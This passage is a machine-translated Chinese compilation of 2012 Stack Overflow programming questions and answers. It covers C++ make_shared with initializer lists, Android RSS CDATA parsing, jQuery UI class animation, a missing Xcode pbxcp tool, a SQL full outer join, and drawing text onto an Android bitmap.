            std::cout << string << '\n';
        }
    }
};

int main(int argc, const char * argv[])
{

    func({"foo", "bar", "baz"});
    Func({"foo", "bar", "baz"});
    //auto ptr = std::make_shared<Func>({"foo", "bar", "baz"}); // won't compile.
    //auto ptr = std::make_shared<Func>{"foo", "bar", "baz"}; // nor this.
    return 0;
} 
```

我做错了什么还是编译器？编译器是：

$ clang++ --version Apple clang 版本 4.0 (tags/Apple/clang-421.0.57) (基于 LLVM 3.1svn)

编辑：shared_ptr 而不是 make_shared。

这是错误：

```
make -k 
clang++ -std=c++11 -stdlib=libc++    main.cc   -o main
main.cc:28:18: error: no matching function for call to 'make_shared'
      auto ptr = std::make_shared<Func>({"foo", "bar", "baz"});
                 ^~~~~~~~~~~~~~~~~~~~~~
/usr/bin/../lib/c++/v1/memory:4621:1: note: candidate function not viable:
     requires 0 arguments, but 1 was provided
make_shared(_Args&& ...__args)
^
1 error generated. 
```

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-08-06T00:00:25.057

尝试这个：

```
auto ptr = std::make_shared<Func>(std::initializer_list<std::string>{"foo", "bar", "baz"}); 
```

Clang 不愿意推断`{"foo", "bar", "baz"}`. 我目前不确定这是否是该语言应该工作的方式，或者我们是否正在查看编译器错误。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-05T23:33:18.390

的构造函数`shared_ptr<T>`将类型指针`T*`作为其参数，假定指向动态分配的资源（或至少可以被删除器释放的东西）。另一方面，`make_shared`为您进行构造并直接获取构造函数参数。

所以要么你这样说：

```
std::shared_ptr<Foo> p(new Foo('a', true, Blue)); 
```

或者，更好、更有效：

```
auto p = std::make_shared<Foo>('a', true, Blue); 
```

后一种形式为您处理分配和构造，并在此过程中创建更有效的实现。

你当然也可以说`make_shared<Foo>(Foo('a', true, Blue))`，但这只会创建一个不必要的副本（可能会被省略），更重要的是它会产生不必要的冗余。[*编辑*]对于初始化你的向量，这可能是最好的方法：

```
auto p = std::make_shared<Func>(std::vector<std::string>({"a", "b", "c"})); 
```

不过，重要的一点是，它为您`make_shared` *执行动态分配*，而 shared-ptr 构造函数*不会*，而是*获取所有权*。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-05T23:29:35.950

`make_shared`如果要创建一个由这些参数构造的新对象，则需要使用`shared_ptr`. `shared_ptr<T>`就像一个指向的指针`T`——它需要用指向的*指针*来构造`T`，而不是`T`.

编辑：当涉及初始化列表时，完美的转发实际上并不完美（这很糟糕）。这不是编译器中的错误。您将必须`Func`手动创建类型的右值。

# android - 在android RSS中解析CDATA

> ID：11820983
> 
> 赞同：2
> 
> 时间：2012-08-05T23:28:03.857
> 
> 标签：android, rss, cdata

我正在尝试制作一个读取 RSS 提要的 ANDROID 应用程序，所以我使用了本教程（[http://android-er.blogspot.com/2010/05/simple-rss-reader-ii-implement-with.html](http://android-er.blogspot.com/2010/05/simple-rss-reader-ii-implement-with.html)）和将它实现到我自己的 url RSS 馈送器。但是没有显示描述标签..主要是馈线的xml中的cz，描述标签是CDATA。我如何解析我的 rss 中的描述 cdata？？谢谢！这是我的 RSSHandler 代码：

```
import org.xml.sax.Attributes;
import org.xml.sax.SAXException; import org.xml.sax.helpers.DefaultHandler;

public class RSSHandler extends DefaultHandler {

final int state_unknown = 0;
final int state_title = 1;
final int state_description = 2;
final int state_link = 3;
final int state_pubdate = 4;
int currentState = state_unknown;

RSSFeed feed;
RSSItem item;

boolean itemFound = false;

 RSSHandler(){
}

RSSFeed getFeed(){
   return feed;
 }

@Override
  public void startDocument() throws SAXException {
   // TODO Auto-generated method stub
   feed = new RSSFeed();
   item = new RSSItem();

   }

@Override
   public void endDocument() throws SAXException {
   // TODO Auto-generated method stub
   }

@Override
 public void startElement(String uri, String localName, String qName,
    Attributes attributes) throws SAXException {
// TODO Auto-generated method stub

if (localName.equalsIgnoreCase("item")){
    itemFound = true;
    item = new RSSItem();
    currentState = state_unknown;
}
else if (localName.equalsIgnoreCase("title")){
    currentState = state_title;
}
else if (localName.equalsIgnoreCase("description")){
    currentState = state_description;
}
else if (localName.equalsIgnoreCase("link")){
    currentState = state_link;
}
else if (localName.equalsIgnoreCase("pubdate")){
    currentState = state_pubdate;
}
else{
    currentState = state_unknown;
}

 }

 @Override
   public void endElement(String uri, String localName, String qName)
    throws SAXException {
// TODO Auto-generated method stub
if (localName.equalsIgnoreCase("item")){
    feed.addItem(item);
}
}

 @Override
    public void characters(char[] ch, int start, int length)
    throws SAXException {
// TODO Auto-generated method stub

String strCharacters = new String(ch,start,length);

if (itemFound==true){
// "item" tag found, it's item's parameter
    switch(currentState){
    case state_title:
        item.setTitle(strCharacters);
        break;
    case state_description:
        item.setDescription(strCharacters);
        break;
    case state_link:
        item.setLink(strCharacters);
        break;
    case state_pubdate:
        item.setPubdate(strCharacters);
        break;  
    default:
        break;
    }
}
else{
// not "item" tag found, it's feed's parameter
    switch(currentState){
    case state_title:
        feed.setTitle(strCharacters);
        break;
    case state_description:
        feed.setDescription(strCharacters);
        break;
    case state_link:
        feed.setLink(strCharacters);
        break;
    case state_pubdate:
        feed.setPubdate(strCharacters);
        break;  
    default:
        break;
    }
}

currentState = state_unknown;
  } 
```

这是我的 RSSReader 代码：

```
 public class AndroidRssReader extends ListActivity {

private RSSFeed myRssFeed = null;
//private ArrayList<RSSItem> myRssFeed = null;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    try {
        //URL rssUrl = new URL("http://www.gov.hk/en/about/rss/govhkrss.data.xml");
        URL rssUrl = new URL("http://www.merehbi.com/online/index.php?option=com_content&view=category&layout=blog&id=58&Itemid=155&lang=ar&format=feed&type=rss");
        SAXParserFactory mySAXParserFactory = SAXParserFactory.newInstance();
        SAXParser mySAXParser = mySAXParserFactory.newSAXParser();
        XMLReader myXMLReader = mySAXParser.getXMLReader();
        RSSHandler myRSSHandler = new RSSHandler();
        myXMLReader.setContentHandler(myRSSHandler);
        InputSource myInputSource = new InputSource(rssUrl.openStream());
        myXMLReader.parse(myInputSource);

    myRssFeed = myRSSHandler.getFeed(); 
    } catch (MalformedURLException e) {
        e.printStackTrace();    
    } catch (ParserConfigurationException e) {
        e.printStackTrace();    
    } catch (SAXException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();    
    }

    if (myRssFeed!=null)
    {
        TextView feedTitle = (TextView)findViewById(R.id.feedtitle);
        TextView feedDescribtion = (TextView)findViewById(R.id.feeddescribtion);
        TextView feedPubdate = (TextView)findViewById(R.id.feedpubdate);
        TextView feedLink = (TextView)findViewById(R.id.feedlink);
        feedTitle.setText(myRssFeed.getTitle());
        feedDescribtion.setText(myRssFeed.getDescription());
        feedPubdate.setText(myRssFeed.getPubdate());
        feedLink.setText(myRssFeed.getLink());

        ArrayAdapter<RSSItem> adapter =
                new ArrayAdapter<RSSItem>(this,
                        android.R.layout.simple_list_item_1,myRssFeed.getList());
        setListAdapter(adapter);    
    }   
}

@Override
protected void onListItemClick(ListView l, View v, int position, long id) {
    Intent intent = new Intent(this,ShowDetails.class);
    Bundle bundle = new Bundle();
    bundle.putString("keyTitle", myRssFeed.getItem(position).getTitle());
    bundle.putString("keyDescription", myRssFeed.getItem(position).getDescription());
    bundle.putString("keyLink", myRssFeed.getItem(position).getLink());
    bundle.putString("keyPubdate", myRssFeed.getItem(position).getPubdate());
    intent.putExtras(bundle);
    startActivity(intent);  
}
    } 
```

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2014-07-26T08:40:59.557

我使用本教程及其代码 [http://www.androidhive.info/2011/11/android-xml-parsing-tutorial/](http://www.androidhive.info/2011/11/android-xml-parsing-tutorial/)

并通过此答案更改一些代码 [https://stackoverflow.com/a/8489223/3636653](https://stackoverflow.com/a/8489223/3636653)

```
 public static void main(String[] args) throws Exception {
    File file = new File("data.xml");
    DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
    Document doc = builder.parse(file);

    NodeList nodes = doc.getElementsByTagName("topic");
    for (int i = 0; i < nodes.getLength(); i++) {
      Element element = (Element) nodes.item(i);
      NodeList title = element.getElementsByTagName("title");
      Element line = (Element) title.item(0);
      System.out.println("Title: " + getCharacterDataFromElement(line));
    }
  }
  public static String getCharacterDataFromElement(Element e) {
    Node child = e.getFirstChild();
    if (child instanceof CharacterData) {
      CharacterData cd = (CharacterData) child;
      return cd.getData();
    }
    return "";
  } 
```

# jquery - jQuery UI 的 addClass 动画不会对子元素的更改进行动画处理

> ID：11820993
> 
> 赞同：1
> 
> 时间：2012-08-05T23:29:39.243
> 
> 标签：jquery, css, jquery-ui, animation

我正在尝试使用 jQuery UI 的添加/删除类动画来切换父元素上的类，这将动画整个页面中各种子元素的许多变化。当 CSS 更改直接影响我正在添加类的元素时，我可以让它工作，但它似乎并没有为子元素的更改设置动画。

例如，如果我的 HTML 是这样的：

```
<div class="parent">
  <span class="child">added to my parent</span>
</div> 
```

CSS：

```
.red-parent .child { background-color: red; } 
```

当我尝试这样做`$( ".parent" ).addClass("red-parent",2000)`时，没有动画`.child`- 2 秒后颜色变为红色。

[jsFiddle 在这里进行比较](http://jsfiddle.net/tobek/XMWnW/)。

任何建议将不胜感激！

**更新：**

我仍然无法弄清楚这一点，但能够使用 CSS3 的转换在兼容的浏览器中近似效果：

```
.child {
  -webkit-transition: all 1s ease;
  -moz-transition: all 1s ease;
  -o-transition: all 1s ease;
  transition: all 1s ease;
} 
```

这意味着我不必担心 jQuery 动画 - 根本不必使用 jQuery UI。`addClass()`等将自动动画。但是，jQuery UI 不应该能够做到这一点吗？CSS 过渡对于我想要的东西来说有点矫枉过正，并且可能会妨碍我想要在相同元素上执行的其他动画（例如，将鼠标悬停在菜单项上）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-11-23T11:03:31.407

调用 .addClass 时需要传递 children:true 选项

```
$(".parent").addClass("red-parent", { duration:2000, children:true }); 
```

jQueryUI 文档说如下：

> children（默认值：false）
> 类型：Boolean
> 动画是否应该另外应用于匹配元素的所有后代。应谨慎使用此功能，因为确定要为哪些后代设置动画的成本可能非常昂贵，并且会随着后代的数量线性增长。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-01T20:08:39.607

jQuery UI 1.8.x 仅对从指定元素“.parent”添加/删除的类的属性进行动画处理。然后死者在动画结束时“弹出”他们的属性。如果您想为孩子制作动画，则将类添加到每个孩子并为孩子更新您的 CSS。

我还用“.click”替换了鼠标事件，用“.toggleClass”替换了方法。

```
$(function() {
    $( "#button" ).click(
        function() {
            $( ".parent" ).children().toggleClass("red", 2000);
        });
}); 
```

jsFiddle 示例：http: [//jsfiddle.net/bTcAV/1/](http://jsfiddle.net/bTcAV/1/)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-08-05T23:51:05.727

你需要使用`jQuery UI 1.8.18`. 将其导入您的脑海中。您可以从这里下载它[http://jqueryui.com/download](http://jqueryui.com/download) 应该可以。

# iphone - Xcode 中缺少 iOS Devtools.Core 框架 pbxcp？

> ID：11820995
> 
> 赞同：4
> 
> 时间：2012-08-05T23:29:43.563
> 
> 标签：iphone, frameworks, devtools

我下载了 Doomclassic 源代码并想看看它。首先，我想编译它以查看它是否真的有效。所以我按照说明将 .wad 文件复制到基本文件夹中，打开项目并点击编译。除了 300 多个警告和丢失的文件（主要是图像，我主要修复）之外，我在编译阶段遇到了一个奇怪的错误，谷歌根本没有帮助。

它说：

> /Users/tobias/Library/Developer/Xcode/DerivedData/Doom-egfadrxunamfwjdsdaylawcyppkc/Build/Intermediates/Doom.build/Debug-iphonesimulator/Doom.build/Script-435F41A90F532CA300887552.sh：第3行：/Applications/Xcode.app/Contents /Developer/Library/PrivateFrameworks/DevToolsCore.framework/Resources/pbxcp：没有这样的文件或目录

当我检查我的 Xcode.app 时 PrivateFrameworks 文件夹中的唯一框架是 IDEBundleInjection.framework

我还看了一下脚本：

> # !/bin/sh -x
> 
> PBXCP=${DEVELOPER_DIR}/Library/PrivateFrameworks/DevToolsCore.framework/Resources/pbxcp ${PBXCP} -exclude .svn "${PROJECT_DIR}/../../base" "${BUILT_PRODUCTS_DIR}/${UNLOCALIZED_RESOURCES_FOLDER_PATH} /"

所以看来我需要这个框架 - 但即使使用谷歌我也找不到它，我也不知道如何将它集成到 Xcode 应用程序中？我刚刚将 Xcode 更新到 4.4，但仍然是同样的错误。

请问有人有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T01:50:00.430

pbxcp 命令已从 XCode 4.4 中删除，因此您必须找到它的替代品。请参阅 [此邮件列表线程](http://www.cocoabuilder.com/archive/xcode/319936-pbxcp-vanished-in-xcode-4-4.html "这里")以了解该命令的替代方案。

# sql - SQL将两个表与一个相同的列组合在一起而不会丢失不同的值

> ID：11820997
> 
> 赞同：1
> 
> 时间：2012-08-05T23:29:55.803
> 
> 标签：sql

我已经为此苦苦挣扎了一段时间，我有两个不同的表共享一列，但都有不同的行数。一张表用于付款请求（表 1），另一张用于证明费用（表 2）

### 表格1

```
+-----------+-----------+
|expenseid  | requestid |
+-----------+-----------+
| 16333     | 7454      |
| NULL      | 7455      |
| 16336     | 7456      |
| 16338     | 7457      |
| NULL      | 7458      |
| 16341     | 7459      |
| 16345     | 7460      |
| NULL      | 7461      |
| NULL      | 7462      |
+-----------+-----------+ 
```

### 表 2

```
+-----------+-----------+
|expenseid  | amount    |
+-----------+-----------+
| 16333     | 200       |
| 16334     | 150       |
| 16335     | 300       |
| 16336     | 900       |
| 16337     | 100       |
| 16338     | 120       |
| 16339     | 700       |
| 16340     | 431       |
| 16341     | 420       |
| 16342     | 150       |
| 16343     | 240       |
| 16344     | 465       |
| 16345     | 200       |
| 16346     | 120       |
| 16347     | 90        |
| 16348     | 50        |
| 16349     | 245       |
+-----------+-----------+ 
```

如您所见，这些表共享同一列“expenseid”，但行数不同，并且有两个不同的列彼此不对应，我希望有一个如下表

### 组合表

```
+-----------+-----------+-----------+
|expenseid  | amount    | requestid | 
+-----------+-----------+-----------+
| 16333     | 200       | 7454      |
| NULL      | NULL      | 7455      |
| 16334     | 150       | NULL      |
| 16335     | 300       | NULL      |
| 16336     | 900       | 7456      |
| 16337     | 100       | NULL      |
| 16338     | 120       | 7457      |
| NULL      | NULL      | 7458      |
| 16339     | 700       | NULL      |
| 16340     | 431       | NULL      |
| 16341     | 420       | 7459      |
| 16342     | 150       | NULL      |
| 16343     | 240       | NULL      |
| 16344     | 465       | NULL      |
| 16345     | 200       | 7460      |
| NULL      | NULL      | 7461      |
| NULL      | NULL      | 7462      |
| 16346     | 120       | NULL      |
| 16347     | 90        | NULL      |
| 16348     | 50        | NULL      |
| 16349     | 245       | NULL      |
+-----------+-----------+-----------+ 
```

我设法以一种方式合并两个表，它显示与表 1 相关的费用 ID 的空值与左外连接，但它没有显示列 requestid 的空值，关于如何执行此操作的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T23:34:03.223

你需要 a[`FULL OUTER JOIN`](http://en.wikipedia.org/wiki/Join_%28SQL%29#Full_outer_join)而不是 a `LEFT OUTER JOIN`。

```
SELECT
    COALESCE(Table1.expenseid, Table2.expenseid) AS expenseid,
    amount,
    requestid
FROM Table1
FULL OUTER JOIN Table2
ON Table1.expenseid = Table2.expenseid 
```

结果：

```
EXPENSEID   AMOUNT  REQUESTID
16333       200     7454
(null)      (null)  7455
16336       900     7456
16338       120     7457
...etc... 
```

在线查看它：[sqlfiddle](http://sqlfiddle.com/#!3/d8951/3)

# android - 位图上的Android自定义文本

> ID：11820999
> 
> 赞同：0
> 
> 时间：2012-08-05T23:30:10.757
> 
> 标签：android, canvas, imageview

如何制作编辑字段

```
 <EditText
                android:id="@+id/etText"
                android:layout_width="match_parent"
                android:layout_height="wrap_content" >

                <requestFocus />

            </EditText> 
```

里面写了什么，使用 Canvas 写在 imageview 上？

我看到了很多代码和方法，但它们是为了在画布上自动写入或位图版权..我希望在编辑字段中输入的内容在画布上输入..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T00:46:42.730

有两种方法可以实现这一点，

1 - 使用 Canvas.drawText 方法，例如：

```
Bitmap b = Bitmap.createBitmap(500,500,Bitmap.Config.Alpha_8888);
Canvas c = new Canvas(b);
c.drawText("Sample Text"); // could be c.drawText(editText.getText()); 
```

2 - 使用editText.draw方法（推荐）

```
EditText et = (EditText) findViewById(R.id.your_edit_text);
Bitmap b = Bitmap.createBitmap(500,500,Bitmap.Config.Alpha_8888);
Canvas c = new Canvas(b);
et.draw(c); 
```

希望对你有帮助，有什么问题可以留言